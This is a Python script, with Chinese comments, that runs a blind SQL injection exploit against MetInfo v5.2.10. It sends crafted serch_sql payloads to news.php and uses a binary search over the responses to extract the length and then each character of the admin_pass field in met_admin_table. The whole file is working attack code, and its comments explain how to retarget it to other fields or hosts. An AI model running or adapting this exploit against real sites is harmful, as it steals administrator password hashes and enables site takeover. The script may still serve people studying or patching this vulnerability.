#coding=utf-8

__author__ = '小亭&KK---http://molok.lofter.com'

import requests

headers = {
'User-Agent': 'Mozilla/5.0 Chrome/28.0.1500.63'
}
keyword = '2013-12-26'#设置判断返回结果差异的关键字,可根据实际情况修改

datalength = 0
host = 'http://127.0.0.1/MetInfov5.2.10'#需要测试的网站

GetlengthPayload = '/news/news.php?lang=cn&class2=5&serch_sql=as a join met_admin_table as b where if(length(b.admin_pass)>%d,1,0) limit 3,1-- sd&imgproduct=xxxx'

GetDataPayload   = '/news/news.php?lang=cn&class2=5&serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_pass,%d,1))>%d,1,0) limit 3,1-- sd&imgproduct=xxxx'
#获取的是met_admin_table表中的admin_pass字段值，可根据需要做出更改


#使用二分法判断
def HalfOfIt(payload,maximum,minimum,index=None):
    #index为None时:跑数据的长度
    #index != None 时:跑数据的内容

    requesturl = host+payload
    ave = (maximum+minimum)/2
    if index == None:
        requesturl = requesturl % (ave)
    else:
        requesturl = requesturl % (index,ave)

    content = requests.get(requesturl,headers=headers).content
    #There are two values left to guess
    if maximum-minimum == 1:
        #当最大值和最小值相差1的时候，ave = (maximum+minimum)/2
        # ave的大小和最小值一样，所以要是关键词存在，则说明ascii比最小值大，所以返回最大值
        if keyword in content:
            return maximum
        else:
            return minimum
    if keyword in content:
        #minimum  <---  ave
        #如果关键词存在，说明ascii值大于平均值，所以最小值改为平均值
        return HalfOfIt(payload,maximum,ave,index)
    else:
        #maximum  <---  ave
        #如果关键词不存在，说明ascii值小于平均值，所以最小值改为平均值
        return HalfOfIt(payload,ave,minimum,index)

def GetInfoLength():
    global datalength
    maximum = 35#一般MD5值都是32位的，所以最大值要高于32
    minimum = 1
    datalength = HalfOfIt(GetlengthPayload,maximum,minimum)
    print("[数据长度:]===>%d" % (datalength))

GetInfoLength()
if datalength == 0:
    print('出错啦')
    exit(-1)

output = '[数据内容]===>'
#最小值到最大值对应ASCII表，目的是将特殊字符和数字字母包含到里面
maximum = 126
minimum = 33
for index in range(1,datalength+1):
	#range(1,5) #代表从1到5(不包含5)
	#range(1,5,2) #代表从1到5，间隔2(不包含5)
	#range(5) #代表从0到5(不包含5)
    retval = HalfOfIt(GetDataPayload,maximum,minimum,index)
    output += chr(retval)#ord和chr两个内置的函数，用于字符与ASCII码之间的转换。
    print(output)


